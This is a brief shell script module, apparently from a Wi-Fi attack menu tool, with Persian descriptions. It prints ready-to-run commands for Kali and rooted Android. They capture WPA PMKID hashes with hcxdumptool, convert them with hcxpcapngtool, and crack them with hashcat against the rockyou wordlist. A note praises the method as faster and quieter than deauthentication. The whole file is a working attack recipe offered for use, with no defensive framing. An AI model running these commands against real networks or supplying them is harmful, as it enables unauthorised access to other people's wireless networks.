DESC="گرفتن PMKID بدون نیاز به کلاینت"
REQ="hcxdumptool"
RISK="HIGH"
NOTE="سریع‌تر و بی‌صدا‌تر از دی‌اتنت. روی برخی کارت‌ها کار نمی‌کند"

termux(){ echo "su -c 'hcxdumptool -i wlan0 -o dump.pcapng --enable_status=1'"; }

kali(){
cat <<'EOF'
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
# بعد از ۶۰ ثانیه Ctrl+C
hcxpcapngtool -o hash.22000 dump.pcapng
hashcat -m 22000 hash.22000 rockyou.txt
EOF
}
